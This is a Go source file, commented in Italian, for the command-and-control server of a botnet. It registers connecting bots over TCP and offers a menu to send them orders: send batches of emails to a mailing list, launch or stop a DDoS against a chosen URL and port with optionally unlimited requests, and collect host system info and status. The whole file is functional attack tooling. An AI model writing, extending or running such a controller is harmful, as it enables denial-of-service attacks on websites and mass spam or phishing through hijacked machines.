package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// Bot è la struct contenente le informazioni fondamentali di ogni componente della bot-net
type Bot struct {
	Ip   string `json:"ip"`
	Port string `json:"port"`
}

// SysInfo è la struct contenente le informazioni di sistema di uno degli host
type SysInfo struct {
	Hostname string `bson:hostname`
	Platform string `bson:platform`
	CPU      string `bson:cpu`
	RAM      uint64 `bson:ram`
	Disk     uint64 `bson:disk`
}

// MailingList è la struct contenente la lista di utenti e le email da inviare
type MailingList struct {
	Users []string  `json:"users"`
	Mails []MailObj `json:"mailingListsBodies"`
}

// MailObj è la struct che usiamo per recuperare le informazioni dal JSON
type MailObj struct {
	Subject     string `json:"subject"`
	Body        string `json:"body"`
	MailingList []int  `json:"recipientsList"`
}

// Site è la struct che inviamo ai nostri bot con tutte le info necessarie per iniziare l'attacco DDoS
type Site struct {
	Url   string `json:"url"`
	Times int    `json:"times"`
	Port  int    `json:"port"`
}

// Email è la struct che inviamo ai nostri bot con tutte le info necessarie per effetuare poi l'invio delle mail
type Email struct {
	Subject    string   `json:"subject"`
	Recipients []string `json:"recipients"`
	Body       string   `json:"body"`
}

// Actions è la struct che riceviamo dai bot con lo stato delle operazioni in corso
type Actions struct {
	IsWorkingOnEmail    bool     `json:"email"`
	EmailErrors         []string `json:"emailError"`
	IsWorkingOnRequests bool     `json:"requests"`
	SiteTargeted        string   `json:"RequestsLeft"`
	RequestsErrors      []string `json:"requestsError"`
	IsWorkingOnInfo     bool     `json:"info"`
	InfoError           []string `json:"infoError"`
}

// ConnectedBots Variabile che contiene la lista dei bot connessi alla bot-net a runtime
var ConnectedBots []Bot

// Semaphore ** Semaphore implementation from https://levelup.gitconnected.com/go-concurrency-pattern-semaphore-9587d45f058d **//
type Semaphore interface {
	Acquire()
	Release()
}

type semaphore struct {
	semC chan struct{}
}

func New(maxConcurrency int) Semaphore {
	return &semaphore{
		semC: make(chan struct{}, maxConcurrency),
	}
}
func (s *semaphore) Acquire() {
	s.semC <- struct{}{}
}
func (s *semaphore) Release() {
	<-s.semC
}

var sem Semaphore

//***********//

func main() {
	//Istanziamo il semaforo necessario per garantire la mutua esclusione nei casi di processi concorrenti
	sem = New(1)

	//Tentiamo di metterci in ascolto sulla porta :8080. Nel caso non sia possibile, interrompere il programma
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		panic(err)
	}

	//Apriamo (se esiste) il file con la lista di bot connessi prima della precedente interruzione...
	jsonFile, err := os.Open("ConnectedBots.json")
	if err != nil {
		fmt.Println(err)
	} else {
		//...infine leggiamo il file...
		byteValue, _ := ioutil.ReadAll(jsonFile)
		//...e inseriamo all'interno della variabile globale i bot
		if err := json.Unmarshal(byteValue, &ConnectedBots); err != nil {
			panic(err)
		}
	}
	//Per concludere, chiudiamo il file
	jsonFile.Close()

	//Infine inizializziamo il thread che ci permetterà e gestirà l'accettazione dei nuovi bot nel corso dell'esecuzione
	go acceptConnection(ln)

	//Alcune variabili per gestire la logica del flusso di impartizione dei comandi
	var AreThereBots = true
	var FirstExecution = true

	for {
		if len(ConnectedBots) == 0 {
			if AreThereBots {
				AreThereBots = false
				fmt.Println("Waiting for bots...")
				FirstExecution = true
			}
			time.Sleep(1 * time.Second)

		} else {
			if !FirstExecution {
				fmt.Printf("Operation completed. Press Enter to continue")
				fmt.Scanln()
			}
			AreThereBots = true
			FirstExecution = false
			fmt.Println("\nWhat you want to do?\n\n1) Send a batch of E-mails\n2) Start a DDoS on a specific site\n3) Stop a DDoS attack\n4) Get info about host\n5) Get bot-net status\n6) Poll all bots")
			var value string

			// Prendiamo dall'utente la scelta dell'operazione da effettuare...
			fmt.Scanln(&value)
			//...e cerchiamo di convertirla in int
			parsed, err := strconv.Atoi(value)
			//Se ci siamo riusciti ed è un input valido, procedi con l'operazione selezionata...
			if err == nil && (parsed > 0 && parsed < 7) {
				//...ma prima facciamo scegliere all'utente quali elementi della botnet intende utilizzare
				var selected []Bot
				if parsed != 6 {
					selected = selectBots()
				}
				fmt.Printf("\n")
				switch parsed {
				case 1:
					sendEmail(selected)
					break
				case 2:
					DDoS(selected)
					break
				case 3:
					StopDDoS(selected)
				case 4:
					hostInfo(selected)
					break
				case 5:
					statusBotNet(selected, true)
					break
				case 6:
					statusBotNet(ConnectedBots, false)
				}
			} else {
				//...altrimenti torna alla selezione
				fmt.Println("The value you provided is not correct. Use an appropriate value")
				FirstExecution = true
			}
		}
	}
}

// Funzione necessaria per selezionare i bot da voler impiegare nell'operaione.
func selectBots() []Bot {
	//La funzione continua a ciclare finchè l'utente non effettua una selezione valida
	for {
		fmt.Println("Select a list of bot or use the 'all' command")
		for index, aBot := range ConnectedBots {
			fmt.Printf("%d) %s\n", index, aBot.Ip)
		}
		var value string
		fmt.Scanln(&value)
		if value == "all" {
			return ConnectedBots
		}
		list := strings.Split(value, ",")
		var botList []Bot
		var aborted bool
		for _, aBot := range list {
			botIndex, err := strconv.Atoi(aBot)
			if err != nil || botIndex > len(ConnectedBots)-1 {
				aborted = true
				break
			}
			botList = append(botList, ConnectedBots[botIndex])
		}
		if aborted {
			println("The value you provided is not correct. Use an appropriate value")
		} else {
			return botList
		}
	}
}

// Funzione che gestisce l'operazione di invio e-mail
func sendEmail(bots []Bot) {
	//Carichiamo il database con tutte le mail da inviare presente nel file mailingList.json
	var mailingList MailingList
	jsonFile, err := os.Open("mailingList.json")
	if err != nil {
		fmt.Println(err)
	} else {
		byteValue, _ := ioutil.ReadAll(jsonFile)
		if err := json.Unmarshal(byteValue, &mailingList); err != nil {
			fmt.Println(err.Error())
		}
	}
	jsonFile.Close()

	//Lista con tutti i bot andati offline durante l'esecuzione dell'attacco
	var offlineBots []Bot
	//Mail inviate con successo
	mailsSent := 0

	//Cicliamo adesso su tutte le mail da inviare
	for _, mailToSend := range mailingList.Mails {
		//Impostiamo una variabile per capire se siamo riusciti ad inviare la mail o se c'è stato un errore
		successfulSend := false
		//Inizializzaimo la variabile che conterrà la Email
		var mail Email
		//Aggiungiamo alla mail tutti gli indirizzi alla quale dobbiamo spedirla
		for _, userIndex := range mailToSend.MailingList {
			mail.Recipients = append(mail.Recipients, mailingList.Users[userIndex])
		}
		//Aggiungiamo poi l'oggetto e il messaggio vero e proprio (può essere sia plain tect che HTML)
		mail.Subject = mailToSend.Subject
		mail.Body = mailToSend.Body
		marshalled, _ := json.Marshal(mail)
		//Poi cicliamo fino a quando non riusciamo ad inviare la mail con successo a qualche bot
		for !successfulSend && len(bots) != 0 {
			//Ci prendiamo l'indice del bot (se il numero di mail da inviare è maggiore di quello dei bot, qualcuno o tutti i bot invieranno più mail
			botIndex := mailsSent % len(bots)
			//Prepariamo la richiesta...
			req, err := http.NewRequest("PUT", "http://"+bots[botIndex].Ip+":"+bots[botIndex].Port+"/email",
				bytes.NewReader(marshalled))
			req.Header.Set("Content-Type", "application/json")
			//...e tentiamo l'invio
			_, err = http.DefaultClient.Do(req)
			//Se l'invio non è andato a buon fine, cancella il bot dalla lista e ritenta
			if err != nil {
				offlineBots = append(offlineBots, bots[botIndex])
				fmt.Printf("Bot %s is not online anymore, removing from active bots list...\n\n", bots[botIndex].Ip)
				bots = append(bots[:botIndex], bots[botIndex+1:]...)
				//Altrimenti procedi con la prossima mail
			} else {
				successfulSend = true
				mailsSent++
			}
		}
	}
	//Se il ciclo si è interrotto prematuramente perchè i bot sono finiti, mostrare un messaggio di errore
	if len(bots) == 0 {
		fmt.Printf("Unable to send some mails, all the bots went offline...\n")
	}
	refreshBot(offlineBots)
}

// Funzione che gestisce l'operazione di ricezione delle informazioni sull'host
func hostInfo(bots []Bot) {
	var offlineBots []Bot
	for _, aBot := range bots {
		requestURL := fmt.Sprintf("http://%s:%s/system", aBot.Ip, aBot.Port)
		res, err := http.Get(requestURL)
		if err != nil {
			offlineBots = append(offlineBots, aBot)
			fmt.Printf("Bot %s is not online anymore, removing from active bots list...\n\n", aBot.Ip)
		} else {
			if res.StatusCode != http.StatusOK {
				fmt.Printf("The bot %s could not process the request at the moment. It's probably busy.\n", aBot.Ip)
				fmt.Printf("Error code provided is %d", res.StatusCode)
			} else {
				var system SysInfo
				if err := json.NewDecoder(res.Body).Decode(&system); err != nil {
					println(err.Error())
				}
				fmt.Printf("System of the Bot %s \nHostname:%s\nPlatform:%s\nCPU:%s\nRAM:%d\nDisk:%d\n\n",
					aBot.Ip, system.Hostname, system.Platform, system.CPU, system.RAM, system.Disk)
			}
		}
	}
	refreshBot(offlineBots)
}

// Funzione che gestisce l'operazione di attacco DDoS su di un target ben definito
func DDoS(bots []Bot) {
	var offlineBots []Bot
	var target Site
	println("Select the target")
	fmt.Scanln(&target.Url)
	r, _ := regexp.Compile("http?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b([-a-zA-Z0-9()@:%_\\+.~#?&//=]*)")
	if !r.MatchString(target.Url) {
		println("The url inserted isn't valid")
		return
	}
	println("Select the port where is hosted the target")
	fmt.Scanln(&target.Port)
	println("Select the number of requests you want to send (a negative number means go unless stopped)")
	fmt.Scanln(&target.Times)
	marshalled, err := json.Marshal(target)
	if err != nil {
		println(err.Error())
		return
	}
	for _, aBot := range bots {
		req, err := http.NewRequest("PUT", "http://"+aBot.Ip+":"+aBot.Port+"/site", bytes.NewReader(marshalled))
		req.Header.Set("Content-Type", "application/json")
		res, err := http.DefaultClient.Do(req)
		if err != nil {
			offlineBots = append(offlineBots, aBot)
			fmt.Printf("Bot %s is not online anymore, removing from active bots list...\n\n", aBot.Ip)
		} else {
			if res.StatusCode != http.StatusOK {
				fmt.Printf("The bot %s could not process the request at the moment. It's probably busy.\n", aBot.Ip)
				fmt.Printf("Error code provided is %d", res.StatusCode)
			}
		}
	}
	refreshBot(offlineBots)
}

// Funzione che gestisce l'interruzione dell'attacco DDoS
func StopDDoS(bots []Bot) {
	var offlineBots []Bot
	for _, aBot := range bots {
		req, err := http.NewRequest("DELETE", "http://"+aBot.Ip+":"+aBot.Port+"/site", nil)
		res, err := http.DefaultClient.Do(req)
		if err != nil {
			offlineBots = append(offlineBots, aBot)
			fmt.Printf("Bot %s is not online anymore, removing from active bots list...\n\n", aBot.Ip)
		} else {
			if res.StatusCode != http.StatusOK {
				fmt.Printf("The bot %s could not process the request at the moment. It's probably busy.\n", aBot.Ip)
				fmt.Printf("Error code provided is %d", res.StatusCode)
			}
		}
	}
}

// Funzione che restituisce lo stato attuale della botnet, ovvero tutte le info su cosa stanno facendo i bot e che errori hanno riscontrato
func statusBotNet(bots []Bot, IsPrint bool) {
	var offlineBots []Bot
	for _, aBot := range bots {
		requestURL := fmt.Sprintf("http://%s:%s/status", aBot.Ip, aBot.Port)
		res, err := http.Get(requestURL)
		if err != nil {
			offlineBots = append(offlineBots, aBot)
			if IsPrint {
				fmt.Printf("Bot %s is not online anymore, removing from active bots list...\n\n", aBot.Ip)
			}
		} else {
			if res.StatusCode != http.StatusOK {
				fmt.Printf("The bot %s could not process the request at the moment. It's probably busy.\n", aBot.Ip)
				fmt.Printf("Error code provided is %d\n", res.StatusCode)
			} else {
				var status Actions
				if err := json.NewDecoder(res.Body).Decode(&status); err != nil {
					println(err.Error())
				}
				if IsPrint {
					fmt.Printf("Status of Bot %s\n", aBot.Ip)
					fmt.Printf("-)Working on Emails?: %t\n", status.IsWorkingOnEmail)
					if len(status.EmailErrors) != 0 {
						fmt.Printf("Errors on execution of Emails: %s\n", status.EmailErrors)
					} else {
						fmt.Printf("Errors on execution of Emails: none\n")
					}
					fmt.Printf("-)Working on HTTP requests?: %t\n", status.IsWorkingOnRequests)
					if len(status.EmailErrors) != 0 {
						fmt.Printf("Errors on execution of HTTP requests: %s\n", status.RequestsErrors)
					} else {
						fmt.Printf("Errors on execution of HTTP requests: none\n")
					}
					if status.IsWorkingOnRequests {
						fmt.Printf("Site Targeted: %s\n", status.SiteTargeted)
					}
					fmt.Printf("-)Working on retrieving system info?: %t\n", status.IsWorkingOnInfo)
					if len(status.InfoError) != 0 {
						fmt.Printf("Errors on execution of Emails: %s\n", status.InfoError)
					} else {
						fmt.Printf("Errors on execution of Emails: none\n")
					}
					fmt.Printf("\n")
				}
			}
		}
	}
	refreshBot(offlineBots)
	fmt.Printf("The botnet consists of %d bots connected\n", len(ConnectedBots))
}

// Funzione che elimina i bot andati offline e aggiorna il file ConnectedBots.json che salva la lista di slave (o bot)
func refreshBot(offlineBots []Bot) {
	sem.Acquire()
	var newList []Bot
	for _, aBot := range ConnectedBots {
		var remove bool
		for _, toRemove := range offlineBots {
			if aBot.Ip == toRemove.Ip && aBot.Port == toRemove.Port {
				remove = true
				break
			}
		}
		if !remove {
			newList = append(newList, aBot)
		}
	}
	ConnectedBots = newList
	file, _ := json.MarshalIndent(ConnectedBots, "", " ")
	_ = ioutil.WriteFile("ConnectedBots.json", file, 0644)
	sem.Release()
}

// Funziona che accetta la connessione e crea un thread per effettuare l'effettiva registrazione del bot
func acceptConnection(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			println(err.Error())
		}
		go handleConnection(conn)
	}

}

// Funzione che registra effettivamente il nostro nuovo bot nella botnet e lo aggiunge al file ConnectedBots.json
func handleConnection(conn net.Conn) {
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		println(err.Error())
		return
	}
	received := string(buf[:n])
	bot := new(Bot)
	sem.Acquire()
	bot.Ip = strings.Split(received, ":")[0]
	bot.Port = strings.Split(received, ":")[1]
	reconnected := false
	//Check per controllare se il bot che si sta connettendo è già presente nella lista (si sta riconnettendo)
	for _, aBot := range ConnectedBots {
		if aBot.Ip == bot.Ip && aBot.Port == bot.Port {
			reconnected = true
			break
		}
	}
	if !reconnected {
		ConnectedBots = append(ConnectedBots, *bot)
	}
	file, _ := json.MarshalIndent(ConnectedBots, "", " ")
	_ = ioutil.WriteFile("ConnectedBots.json", file, 0644)
	sem.Release()
}
